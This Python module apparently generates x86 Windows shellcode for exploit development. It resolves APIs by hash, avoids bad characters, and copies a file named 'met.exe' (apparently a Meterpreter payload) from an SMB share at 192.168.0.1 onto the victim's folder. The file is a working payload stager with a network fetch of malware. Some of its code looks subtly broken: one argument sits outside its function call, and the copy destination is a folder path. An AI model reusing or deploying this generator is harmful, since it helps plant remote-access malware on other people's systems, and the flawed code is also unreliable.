from coder import call_exit_func, find_and_call
from coder.util import (
    convert_ip_addr_bytes,
    convert_port_hex,
    find_hash_key,
    push_hash,
    push_string,
)


def generate(bad_chars, exit_func, debug=False):
    hash_key = find_hash_key(
        [
            ("SHELL32.DLL", "SHGetFolderPathA"),
            ("KERNEL32.DLL", "CopyFileA"),
            ("KERNEL32.DLL", "CreateProcessA"),
        ]
        + ([exit_func] if exit_func else []),
        bad_chars,
    )

    return f"""
    start:
        {'int3' if debug else ''}       // Breakpoint for Windbg
        mov   ebp, esp
        add   esp, 0xfffff9f0           // Avoid NULL bytes

    {find_and_call.generate(hash_key)}

    get_desktop_path:                   // SHFOLDERAPI SHGetFolderPathA([in] HWND hwnd, [in] int csidl, [in] HANDLE hToken, [in] DWORD dwFlags, [out] LPSTR pszPath);
        sub esp, 0x200                  // BufferAllocation to contain Desktop path
        lea eax, [esp]                  // put @buffer in eax
        push eax                        // Argument5: pszPath
        mov edi, eax                    // On sauvegarde le pointeur vers notre buffer dans EDI
        xor eax, eax                    // eax <- 0
        push eax                        // Argument4: dwFlags
        push eax                        // Argument3: hToken
        mov eax, 0x10                   // 
        push eax                        // Argument2: csidl
        xor  eax, eax                   // eax <- 0
        push eax                        // Argument1: hwnd
        {push_hash('SHELL32.DLL', 'SHGetFolderPathA', hash_key)}
        call dword ptr [ebp+0x04]       // Call SHGetFolderPathA
        
    copy_to_desktop:                    // BOOL CopyFileA([in] LPCSTR lpExistingFileName, [in] LPCSTR lpNewFileName, [in] BOOL bFailIfExists);
        xor eax, eax                    //
        push eax                        // Argument3: bFailIfExists
        push edi                        // Argument2: Destination
        {push_string("\\\\192.168.0.1\\dep\\met.exe"), bad_chars}   // Argument1: lpExistingFileName
        {push_hash('KERNEL32.DLL', 'CopyFileA', hash_key)}
        call dword ptr [ebp+0x04]       // Call CopyFileA

    {call_exit_func.generate(exit_func, hash_key)}
    """
